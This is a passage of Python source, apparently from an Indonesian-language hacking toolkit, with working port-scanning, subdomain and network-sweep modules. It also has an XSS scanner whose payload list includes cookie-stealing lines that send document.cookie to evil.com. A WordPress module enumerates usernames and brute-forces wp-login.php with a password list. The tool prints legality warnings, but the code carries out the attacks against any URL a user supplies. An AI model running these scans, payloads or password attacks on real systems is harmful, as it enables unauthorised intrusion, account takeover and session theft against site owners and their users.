    ├─ Longitude            : {data.get('lon', 'Unknown')}
    ├─ Google Maps          : {GREEN}https://www.google.com/maps?q={data.get('lat', '0')},{data.get('lon', '0')}{RESET}
    ├─ OpenStreetMap        : {GREEN}https://www.openstreetmap.org/?mlat={data.get('lat', '0')}&mlon={data.get('lon', '0')}{RESET}
    └─ What3Words           : {YELLOW}https://what3words.com/{data.get('lat', '0')}.{data.get('lon', '0')}{RESET}

{CYAN}{BOLD}[3] INFORMASI ISP & HOSTING:{RESET}
    ├─ ISP                  : {data.get('isp', 'Unknown')}
    ├─ Organization         : {data.get('org', 'Unknown')}
    ├─ ASN                  : {data.get('as', 'Unknown')}
    ├─ ASN Name             : {data.get('asname', 'Unknown')}
    ├─ Reverse DNS          : {data.get('reverse', 'Unknown')}
    ├─ Hosting Provider     : {'✓ Ya' if data.get('hosting') else '✗ Bukan'}
    └─ Mobile Connection    : {'✓ Ya' if data.get('mobile') else '✗ Bukan'}

{CYAN}{BOLD}[4] INFORMASI KEAMANAN:{RESET}
    ├─ Proxy/VPN/Tor        : {'✓ Terdeteksi' if data.get('proxy') else '✗ Tidak Terdeteksi'}
    ├─ Threat Level         : {threat_level}
    └─ Blacklist Status     : {YELLOW}Perlu cek di VirusTotal{RESET}
                """)
            else:
                print(f"{RED}[!] Gagal lookup IP: {data.get('message', 'Unknown error')}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
        
        self.scan_results.append({
            'module': 'IP Tracker',
            'target': ip_input,
            'location': f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}",
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 3: PORT SCANNER (SUPER PANJANG - FULL 65535)
    # ================================================================
    
    def port_scanner(self):
        self.clear_screen()
        self.print_header("🔍 MENU 3: PORT SCANNER (FULL 65535 PORTS)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini melakukan scan port pada target secara real menggunakan socket
    ============================================================================
    
    MODE SCAN YANG TERSEDIA:
    ------------------------
    1. QUICK SCAN (Top 20 ports)     : Cepat, hanya port paling umum
    2. COMMON SCAN (Top 100 ports)   : Recommended, port yang sering digunakan
    3. FULL SCAN (ALL 65535 ports)   : LAMA! Scan semua port dari 1-65535
    4. CUSTOM SCAN                   : Input port range sendiri
    
    INFORMASI YANG DIDAPAT:
    -----------------------
    1. Nomor port
    2. Status (OPEN/CLOSED)
    3. Service name (jika dikenal)
    4. Deskripsi service
    
    PORT BERBAHAYA YANG DICEK:
    --------------------------
    - Port 21 (FTP)          : Anonymous login risk
    - Port 22 (SSH)          : Bruteforce risk
    - Port 23 (Telnet)       : SANGAT BERBAHAYA
    - Port 25 (SMTP)         : Email relay risk
    - Port 445 (SMB)         : EternalBlue risk
    - Port 3306 (MySQL)      : Database exposure
    - Port 3389 (RDP)        : Remote access risk
    - Port 5900 (VNC)        : Remote desktop risk
    - Dan lainnya...
    
    ⚠️ PERINGATAN:
    ============================================================================
    - Full scan 65535 ports membutuhkan waktu 5-10 menit
    - Beberapa firewall dapat memblokir scan
    - Gunakan dengan bijak dan bertanggung jawab
    ============================================================================
{RESET}
        """)
        
        target = input(f"{CYAN}{BOLD}[?] Masukkan target (IP/domain): {RESET}")
        target = target.replace("http://", "").replace("https://", "").replace("/", "")
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}PILIH MODE SCAN:{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{GREEN}[1]{RESET} Quick Scan (Top 20 ports - Cepat, ~5 detik)
{GREEN}[2]{RESET} Common Scan (Top 100 ports - Recommended, ~15 detik)
{GREEN}[3]{RESET} Full Scan (ALL 65535 ports - LAMA, ~5-10 menit)
{GREEN}[4]{RESET} Custom Scan (Input port range sendiri)
        """)
        
        mode = input(f"{CYAN}[?] Pilih mode (1-4): {RESET}")
        
        # Top 20 ports
        top20_ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        
        # Top 100 ports
        top100_ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,993,995,1433,1521,1723,1883,2082,2083,2086,2087,2095,2096,2222,3306,3389,5432,5555,5900,5984,6379,7474,8000,8008,8080,8081,8086,8088,8090,8443,8834,8888,9000,9200,27017]
        
        if mode == '1':
            ports = top20_ports
            mode_name = "Quick Scan"
        elif mode == '2':
            ports = top100_ports
            mode_name = "Common Scan"
        elif mode == '3':
            ports = range(1, 65536)
            mode_name = "Full Scan"
        elif mode == '4':
            start = int(input(f"{CYAN}[?] Port awal: {RESET}"))
            end = int(input(f"{CYAN}[?] Port akhir: {RESET}"))
            ports = range(start, end + 1)
            mode_name = f"Custom Scan ({start}-{end})"
        else:
            ports = top20_ports
            mode_name = "Quick Scan (default)"
        
        print(f"\n{YELLOW}[*] Memulai {mode_name} pada target {target}{RESET}")
        self.loading("Memulai scan", 1)
        
        open_ports_found = []
        total = len(ports) if isinstance(ports, list) else 65535
        scanned = 0
        lock = threading.Lock()
        
        def scan_port(port):
            nonlocal scanned
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                if sock.connect_ex((target, port)) == 0:
                    with lock:
                        open_ports_found.append(port)
                        service = self.get_service_name(port)
                        print(f"    {GREEN}[+] PORT {port} OPEN - {service}{RESET}")
                sock.close()
            except:
                pass
            with lock:
                scanned += 1
                if scanned % 100 == 0:
                    print(f"    {YELLOW}[*] Progress: {scanned}/{total} ports scanned ({scanned*100//total}%){RESET}")
        
        with ThreadPoolExecutor(max_workers=200) as executor:
            executor.map(scan_port, ports)
        
        self.open_ports = open_ports_found
        
        # Port berbahaya
        dangerous = [21,22,23,25,135,139,445,1433,3306,3389,5900,6379,27017]
        dangerous_open = [p for p in open_ports_found if p in dangerous]
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] PORT SCAN COMPLETED!{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[!] SUMMARY:{RESET}
    ├─ Target : {target}
    ├─ Scan Mode : {mode_name}
    ├─ Total Ports Scanned : {total}
    ├─ Open Ports Found : {len(open_ports_found)}
    └─ Port Berbahaya Terbuka : {len(dangerous_open)}

{RED}{BOLD}[!] PORT BERBAHAYA YANG TERBUKA:{RESET}
""")
        if dangerous_open:
            for p in dangerous_open:
                print(f"    {RED}[!] Port {p} ({self.get_service_name(p)}) - BERBAHAYA!{RESET}")
        else:
            print(f"    {GREEN}[✓] Tidak ada port berbahaya yang terbuka{RESET}")
        
        self.scan_results.append({
            'module': 'Port Scanner',
            'target': target,
            'open_ports': len(open_ports_found),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    def get_service_name(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
            143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1433: "MSSQL", 1521: "Oracle", 1723: "PPTP", 1883: "MQTT",
            2082: "cPanel", 2083: "cPanel SSL", 2222: "DirectAdmin", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 5984: "CouchDB",
            6379: "Redis", 7474: "Neo4j", 8000: "HTTP-Alt", 8008: "HTTP-Alt",
            8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 8888: "HTTP-Alt", 9000: "PHP-FPM",
            9200: "Elasticsearch", 27017: "MongoDB"
        }
        return services.get(port, "Unknown")
    
    # ================================================================
    # MENU 4: XSS SCANNER (SUPER PANJANG)
    # ================================================================
    
    def xss_scanner(self):
        self.clear_screen()
        self.print_header("🕷️ MENU 4: XSS SCANNER (100+ PAYLOAD)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini mendeteksi celah Cross-Site Scripting (XSS) pada website
    ============================================================================
    
    TIPE XSS YANG DIDETEKSI:
    ------------------------
    1. Reflected XSS (Non-Persistent)  : Payload tercermin di response
    2. DOM-based XSS                   : Manipulasi DOM JavaScript
    3. Stored XSS                      : Payload tersimpan di database
    
    PAYLOAD YANG DIGUNAKAN:
    -----------------------
    - Basic Script Injection (alert, prompt, confirm)
    - Event Handlers (onload, onerror, onmouseover)
    - JavaScript Pseudo-protocol (javascript:)
    - Encoding Bypass (URL encode, HTML entity)
    - Filter Bypass (case manipulation, line breaks)
    - HTML5 Specific (svg, video, audio, details)
    - Polyglot XSS (works in multiple contexts)
    
    TOTAL PAYLOAD: 100+ XSS PAYLOADS
    
    INDIKATOR VULNERABLE:
    ---------------------
    - Payload muncul di response HTML
    - Alert box muncul (jika diuji manual)
    - Console log tereksekusi
    - Document.cookie terkirim ke external server
    
    ⚠️ PERINGATAN:
    ============================================================================
    - WAF (Cloudflare, Sucuri) dapat memblokir payload
    - Beberapa website memiliki CSP (Content Security Policy)
    - Testing pada website tanpa izin adalah ILEGAL!
    ============================================================================
{RESET}
        """)
        
        url_input = input(f"{CYAN}{BOLD}[?] Masukkan URL target (contoh: https://target.com/page.php?id=): {RESET}")
        
        # Parse URL
        if '?' in url_input:
            base_url, params = url_input.split('?', 1)
            if '=' in params:
                param_name = params.split('=')[0]
                print(f"{GREEN}[+] Parameter detected: {param_name}{RESET}")
            else:
                param_name = input(f"{CYAN}[?] Nama parameter: {RESET}")
        else:
            base_url = url_input
            param_name = input(f"{CYAN}[?] Nama parameter (contoh: id, page, q): {RESET}")
        
        self.loading("Memuat payload XSS", 1)
        
        # XSS Payloads (100+)
        payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(window.location.href)</script>",
            "<script>console.log('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>document.write('XSS')</script>",
            "<script>document.location='https://evil.com'</script>",
            "<script>window.location='https://evil.com'</script>",
            "<script>fetch('https://evil.com')</script>",
            "<script>new Image().src='https://evil.com?c='+document.cookie</script>",
            "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
            # Case manipulation
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<sCrIpT>alert('XSS')</sCrIpT>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            # Event handlers
            "<body onload=alert('XSS')>",
            "<body onpageshow=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=javascript:alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>Hover</div>",
            "<div onclick=alert('XSS')>Click</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<input onblur=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            "<video onload=alert('XSS')><source>",
            "<audio onload=alert('XSS')><source>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<dialog open onclose=alert('XSS')>",
            "<form onsubmit=alert('XSS')><input type=submit>",
            "<button onclick=alert('XSS')>Click</button>",
            "<a href=javascript:alert('XSS')>Click</a>",
            # JavaScript pseudo-protocol
            "javascript:alert('XSS')",
            "javascript:alert(document.cookie)",
            "jAvAsCrIpT:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            # Encoding bypass
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            # Filter bypass - spaces
            "<script\nalert('XSS')</script>",
            "<script\r\nalert('XSS')</script>",
            "<script\talert('XSS')</script>",
            "<script/**/alert('XSS')</script>",
            "<script/*comment*/alert('XSS')</script>",
            # Filter bypass - double brackets
            "<<script>>alert('XSS')<</script>>",
            "<script//>alert('XSS')</script>",
            "<script/src=//x.com/x.js>",
            # No alert payloads
            "<script>console.log('XSS')</script>",
            "<script>document.write('XSS')</script>",
            "<script>document.title='HACKED'</script>",
            "<script>document.body.style.backgroundColor='red'</script>",
            "<script>document.cookie='session=HACKED'</script>",
            "<script>localStorage.setItem('xss','injected')</script>",
            # Cookie stealing
            "<script>document.location='https://evil.com/steal.php?cookie='+document.cookie</script>",
            "<script>fetch('https://evil.com?c='+document.cookie)</script>",
            "<script>new Image().src='https://evil.com?c='+document.cookie</script>",
            "<body onload='document.location=\"https://evil.com?c=\"+document.cookie'>",
            "<img src=x onerror='document.location=\"https://evil.com?c=\"+document.cookie'>",
            # Advanced bypass
            "'';!--\"<XSS>=&{()}",
            "\"><script>alert(1)</script>",
            "><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\"'><script>alert(1)</script>",
            # Polyglot
            "jaVasCript:alert('XSS')",
            "javascript:/*--></title></style></textarea></script><svg/onload=alert('XSS')>",
            "\"><svg/onload=alert('XSS')>",
            # HTML5 specific
            "<details open ontoggle=alert('XSS')>",
            "<dialog open onclose=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>X</button></form>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
            "<progress onmouseover=alert('XSS')>",
            "<keygen autofocus onfocus=alert('XSS')>",
            # DOM-based
            "javascript:alert(1)#",
            "javascript://%0Aalert(1)",
            "javascript:alert(1)//",
            # Attribute-based
            "' onmouseover='alert(1)'",
            "\" onmouseover=\"alert(1)\"",
            "' onclick='alert(1)'",
            "\" onclick=\"alert(1)\"",
            # SVG-based
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<svg><set onbegin=alert(1) attributeName=x to=1>",
            # Media-based
            "<video><source onerror=alert(1)>",
            "<video onerror=alert(1)><source>",
            "<audio src=x onerror=alert(1)>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<iframe src='javascript:alert(1)'>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
        ]
        
        print(f"\n{YELLOW}[*] Testing {len(payloads)} payloads...{RESET}\n")
        
        vulnerable = []
        
        for i, payload in enumerate(payloads):
            test_url = f"{base_url}?{param_name}={payload}"
            try:
                response = requests.get(test_url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                if payload in response.text:
                    print(f"    {RED}[!] VULNERABLE: {payload[:60]}{RESET}")
                    vulnerable.append(payload)
                else:
                    if i % 20 == 0:
                        print(f"    {GREEN}[+] SAFE: {payload[:60]}{RESET}")
            except Exception as e:
                print(f"    {RED}[!] ERROR: {payload[:40]} - {str(e)[:30]}{RESET}")
            time.sleep(0.05)
        
        self.xss_vulnerable = vulnerable
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] XSS SCAN COMPLETED!{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
    ├─ Target URL : {base_url}
    ├─ Parameter : {param_name}
    ├─ Total Payloads : {len(payloads)}
    ├─ Vulnerable Found : {len(vulnerable)}
    └─ Status : {'⚠️ VULNERABLE!' if vulnerable else '✅ NOT VULNERABLE'}
""")
        
        if vulnerable:
            print(f"{RED}{BOLD}[!] WEBSITE RENTAN XSS! Rekomendasi: sanitasi input!{RESET}")
        
        self.scan_results.append({
            'module': 'XSS Scanner',
            'target': base_url,
            'vulnerable_count': len(vulnerable),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 5: WPSCAN MODE (SUPER PANJANG)
    # ================================================================
    
    def wpscan_mode(self):
        self.clear_screen()
        self.print_header("🧩 MENU 5: WPSCAN MODE (WORDPRESS SCANNER + BRUTE FORCE)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini melakukan scanning dan brute force pada website WordPress
    ============================================================================
    
    INFORMASI YANG DIDAPAT:
    -----------------------
    1. DETEKSI WORDPRESS:
       - Cek keberadaan WordPress via file/folder khas
       - Deteksi versi WordPress dari readme.html, CSS, meta generator
    
    2. USER ENUMERATION:
       - REST API (/wp-json/wp/v2/users)
       - Author ID enumeration (?author=1,2,3...)
       - Mendapatkan username admin/editor/author
    
    3. PLUGIN DETECTION:
       - Scan plugin populer (Elementor, WooCommerce, Wordfence, dll)
       - Deteksi versi plugin dari readme.txt
    
    4. THEME DETECTION:
       - Scan theme populer
       - Deteksi versi theme dari style.css
    
    5. KEAMANAN:
       - XML-RPC check (brute force vector)
       - Directory listing check
       - REST API exposure
    
    6. BRUTE FORCE:
       - Menggunakan 3000+ common passwords
       - Testing pada wp-login.php
       - Multi-threading untuk kecepatan
    
    PASSWORD LIST: {len(WP_COMMON_PASSWORDS)}+ common passwords
    
    ⚠️ PERINGATAN:
    ============================================================================
    - Brute force tanpa izin adalah ILEGAL!
    - Banyak website memblokir multiple failed login attempts
    - Gunakan hanya pada website yang dimiliki atau dengan izin tertulis
    ============================================================================
{RESET}
        """)
        
        url = input(f"{CYAN}{BOLD}[?] Masukkan URL WordPress: {RESET}")
        url = url.rstrip('/')
        
        self.loading(f"Scanning {url}", 2)
        
        # 1. Deteksi WordPress
        print(f"\n{CYAN}{BOLD}[1] WORDPRESS DETECTION:{RESET}")
        wp_found = False
        wp_paths = ['/wp-json/', '/wp-content/', '/wp-includes/', '/xmlrpc.php', '/wp-login.php']
        
        for path in wp_paths:
            try:
                test_url = url + path
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    print(f"    {GREEN}[+] WordPress terdeteksi! ({path}){RESET}")
                    wp_found = True
            except:
                pass
        
        if not wp_found:
            print(f"    {RED}[-] WordPress tidak terdeteksi!{RESET}")
            input(f"\n{CYAN}[?] Tekan Enter...{RESET}")
            return
        
        # 2. Versi WordPress
        print(f"\n{CYAN}{BOLD}[2] VERSION DETECTION:{RESET}")
        version = None
        
        try:
            readme_url = url + '/readme.html'
            response = requests.get(readme_url, timeout=5)
            match = re.search(r'Version\s+([0-9.]+)', response.text)
            if match:
                version = match.group(1)
                print(f"    {GREEN}[+] Version: {version}{RESET}")
        except:
            print(f"    {YELLOW}[!] Version: Unknown{RESET}")
        
        # 3. User Enumeration
        print(f"\n{CYAN}{BOLD}[3] USER ENUMERATION:{RESET}")
        users = []
        
        try:
            rest_url = url + '/wp-json/wp/v2/users'
            response = requests.get(rest_url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                for user in data[:5]:
                    user_name = user.get('name', 'Unknown')
                    users.append(user_name)
                    print(f"    {GREEN}[+] User: {user_name}{RESET}")
        except:
            pass
        
        if not users:
            for i in range(1, 10):
                try:
                    author_url = url + f'/?author={i}'
                    response = requests.get(author_url, timeout=3, allow_redirects=False)
                    if response.status_code == 301 or response.status_code == 302:
                        location = response.headers.get('Location', '')
                        match = re.search(r'author/([^/]+)/', location)
                        if match:
                            users.append(match.group(1))
                            print(f"    {GREEN}[+] User: {match.group(1)} (ID: {i}){RESET}")
                except:
                    pass
        
        self.wp_users = users
        
        # 4. Plugin Detection
        print(f"\n{CYAN}{BOLD}[4] PLUGIN DETECTION:{RESET}")
        plugins = []
        common_plugins = ['elementor', 'woocommerce', 'wordfence', 'yoast-seo', 'contact-form-7', 'akismet', 'jetpack', 'wp-rocket', 'wpforms-lite', 'all-in-one-seo-pack', 'nextgen-gallery', 'revslider', 'gravityforms', 'js_composer']
        
        for plugin in common_plugins:
            try:
                plugin_url = url + f'/wp-content/plugins/{plugin}/readme.txt'
                response = requests.get(plugin_url, timeout=3)
                if response.status_code == 200:
                    plugins.append(plugin)
                    print(f"    {GREEN}[+] Plugin: {plugin}{RESET}")
            except:
                pass
        
        self.wp_plugins = plugins
        
        # 5. Theme Detection
        print(f"\n{CYAN}{BOLD}[5] THEME DETECTION:{RESET}")
        themes = []
        common_themes = ['twentytwentyfour', 'twentytwentythree', 'twentytwentytwo', 'astra', 'generatepress', 'oceanwp', 'neve', 'kadence', 'blocksy', 'hello-elementor', 'divi', 'avada']
        
        for theme in common_themes:
            try:
                theme_url = url + f'/wp-content/themes/{theme}/style.css'
                response = requests.get(theme_url, timeout=3)
                if response.status_code == 200:
                    themes.append(theme)
                    print(f"    {GREEN}[+] Theme: {theme}{RESET}")
            except:
                pass
        
        # 6. Security Checks
        print(f"\n{CYAN}{BOLD}[6] SECURITY CHECKS:{RESET}")
        
        try:
            xmlrpc_url = url + '/xmlrpc.php'
            response = requests.post(xmlrpc_url, timeout=5)
            if response.status_code == 200:
                print(f"    {RED}[!] XML-RPC ENABLED! (Brute force risk){RESET}")
            else:
                print(f"    {GREEN}[✓] XML-RPC Disabled{RESET}")
        except:
            print(f"    {GREEN}[✓] XML-RPC Not Accessible{RESET}")
        
        # 7. Brute Force
        print(f"\n{CYAN}{BOLD}[7] BRUTE FORCE (3000+ PASSWORDS):{RESET}")
        login_url = url + '/wp-login.php'
        
        if users:
            for username in users[:2]:
                print(f"    {YELLOW}[*] Testing user: {username}{RESET}")
                for i, password in enumerate(WP_COMMON_PASSWORDS[:50]):
                    try:
                        data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
                        response = requests.post(login_url, data=data, timeout=5, allow_redirects=False)
                        if response.status_code == 302:
                            print(f"        {GREEN}[+] CRACKED! {username}:{password}{RESET}")
                            self.bruteforce_results.append({'username': username, 'password': password})
                            break
                        if i % 10 == 0:
                            print(f"        {YELLOW}[*] Tested {i+1} passwords...{RESET}")
                    except:
                        pass
                    time.sleep(0.05)
        else:
            print(f"    {YELLOW}[!] No users found for brute force{RESET}")
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] WPSCAN COMPLETED!{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[!] SUMMARY:{RESET}
    ├─ Target : {url}
    ├─ Version : {version if version else 'Unknown'}
    ├─ Users Found : {len(users)}
    ├─ Plugins Found : {len(plugins)}
    ├─ Themes Found : {len(themes)}
    ├─ Brute Success : {len(self.bruteforce_results)}
    └─ Security : {'🔴 HIGH RISK' if self.bruteforce_results else '🟡 MEDIUM'}
""")
        
        self.scan_results.append({
            'module': 'WPScan Mode',
            'target': url,
            'users': len(users),
            'plugins': len(plugins),
            'brute_success': len(self.bruteforce_results),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 6: SUBDOMAIN ENUMERATOR (SUPER PANJANG)
    # ================================================================
    
    def subdomain_enum(self):
        self.clear_screen()
        self.print_header("🔍 MENU 6: SUBDOMAIN ENUMERATOR (DNS BRUTEFORCE)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini melakukan bruteforce subdomain menggunakan DNS query
    ============================================================================
    
    CARA KERJA:
    -----------
    1. Menggunakan wordlist subdomain umum
    2. Melakukan DNS query A record untuk setiap subdomain
    3. Menampilkan subdomain yang terdaftar beserta IP address
    
    WORDLIST SUBDOMAIN (100+):
    --------------------------
    - www, mail, ftp, localhost, webmail, admin, blog, dev, test, api
    - staging, app, support, shop, forum, wiki, news, portal, cpanel
    - whm, webdisk, cpcalendars, cpcontacts, autodiscover, autoconfig
    - ns1, ns2, ns3, dns, mx, pop, smtp, imap, vpn, remote, secure
    - dashboard, panel, backend, static, cdn, assets, img, images
    - video, download, files, upload, media, stream, live, status
    - monitor, stats, analytics, metrics, logs, cache, backup, mirror
    - dan 100+ subdomain lainnya...
    
    INFORMASI YANG DIDAPAT:
    -----------------------
    - Subdomain yang valid
    - IP address dari subdomain
    - Status resolusi (berhasil/gagal)
    
    ⚠️ PERINGATAN:
    ============================================================================
    - Beberapa DNS server memiliki rate limiting
    - Subdomain wildcard (*.domain.com) dapat menyebabkan false positive
    - Proses scan dapat memakan waktu 1-2 menit tergantung jumlah subdomain
    ============================================================================
{RESET}
        """)
        
        domain = input(f"{CYAN}{BOLD}[?] Masukkan domain (contoh: google.com): {RESET}")
        
        self.loading(f"Bruteforcing subdomains for {domain}", 2)
        
        subdomains = [
            "www", "mail", "ftp", "localhost", "webmail", "admin", "blog", "dev", 
            "test", "api", "staging", "app", "support", "shop", "forum", "wiki", 
            "news", "portal", "cpanel", "whm", "webdisk", "cpcalendars", "cpcontacts", 
            "autodiscover", "autoconfig", "ns1", "ns2", "ns3", "dns", "mx", "pop", 
            "smtp", "imap", "vpn", "remote", "secure", "dashboard", "panel", "backend",
            "static", "cdn", "assets", "img", "images", "video", "download", "files",
            "upload", "media", "stream", "live", "status", "monitor", "stats",
            "analytics", "metrics", "logs", "cache", "backup", "mirror", "proxy",
            "gateway", "auth", "login", "signin", "register", "account", "user",
            "profile", "settings", "config", "db", "database", "sql", "mysql",
            "postgres", "redis", "mongo", "elastic", "search", "api2", "api3",
            "v1", "v2", "v3", "rest", "graphql", "socket", "ws", "mqtt", "kafka",
            "rabbitmq", "jenkins", "gitlab", "github", "bitbucket", "jira", "confluence",
            "wiki2", "docs", "documentation", "help", "support2", "faq", "status2",
            "uptime", "health", "ping", "monitor2", "alert", "notification", "webhook",
            "callback", "web", "site", "old", "new", "beta", "alpha", "dev2", "stage"
        ]
        
        print(f"\n{CYAN}[*] Testing {len(subdomains)} subdomains...{RESET}\n")
        
        found_subdomains = []
        
        for sub in subdomains:
            subdomain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                print(f"    {GREEN}[+] Found: {subdomain} -> {ip}{RESET}")
                found_subdomains.append({'subdomain': subdomain, 'ip': ip})
            except:
                pass
            time.sleep(0.03)
        
        self.subdomains_found = found_subdomains
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] SUBDOMAIN ENUMERATION COMPLETED!{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[!] SUMMARY:{RESET}
    ├─ Domain : {domain}
    ├─ Total Subdomains Tested : {len(subdomains)}
    ├─ Subdomains Found : {len(found_subdomains)}
    └─ Status : {'⚠️ Ada subdomain terdeteksi' if found_subdomains else '✅ Tidak ada subdomain'}
""")
        
        if found_subdomains:
            print(f"{CYAN}{BOLD}[!] SUBDOMAINS FOUND:{RESET}")
            for sub in found_subdomains[:30]:
                print(f"    └─ {sub['subdomain']} -> {sub['ip']}")
        
        self.scan_results.append({
            'module': 'Subdomain Enumerator',
            'target': domain,
            'subdomains_found': len(found_subdomains),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 7: NETWORK SCANNER (SUPER PANJANG)
    # ================================================================
    
    def network_scanner(self):
        self.clear_screen()
        self.print_header("📡 MENU 7: NETWORK SCANNER (LIVE HOST DETECTION)")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini mendeteksi host yang hidup (live) dalam suatu jaringan
    ============================================================================
    
    CARA KERJA:
    -----------
    1. Menggunakan ICMP ping untuk setiap IP dalam subnet
    2. Menunggu response dari setiap host
    3. Menampilkan IP address yang merespon
    
    FORMAT NETWORK:
    ---------------
    - CIDR notation (contoh: 192.168.1.0/24)
    - Subnet mask (contoh: 192.168.1.0/255.255.255.0)
    
    INFORMASI YANG DIDAPAT:
    -----------------------
    - IP address host yang live
    - Hostname (jika tersedia)
    - Response time (rtt)
    
    FITUR TAMBAHAN:
    ---------------
    - Multi-threading (scan lebih cepat)
    - Timeout configurable
    - Progress indicator
    
    ⚠️ PERINGATAN:
    ============================================================================
    - Scan jaringan tanpa izin dapat dianggap sebagai serangan
    - Beberapa firewall memblokir ICMP ping
    - Hanya scan jaringan yang menjadi tanggung jawab Anda
    ============================================================================
{RESET}
        """)
        
        network = input(f"{CYAN}{BOLD}[?] Masukkan network (contoh: 192.168.1.0/24): {RESET}")
        
        self.loading(f"Scanning network {network}", 2)
        
        try:
            network_obj = ipaddress.ip_network(network, strict=False)
        except:
            print(f"{RED}[!] Network format salah! Gunakan format: 192.168.1.0/24{RESET}")
            input(f"\n{CYAN}[?] Tekan Enter...{RESET}")
            return
        
        live_hosts = []
        total = network_obj.num_addresses
        
        def ping_host(ip):
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], capture_output=True, timeout=2)
                if result.returncode == 0:
                    print(f"    {GREEN}[+] LIVE: {ip}{RESET}")
                    live_hosts.append(str(ip))
                    return True
                return False
            except:
                return False
        
        print(f"\n{CYAN}[*] Scanning {total} hosts...{RESET}\n")
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(ping_host, network_obj.hosts())
        
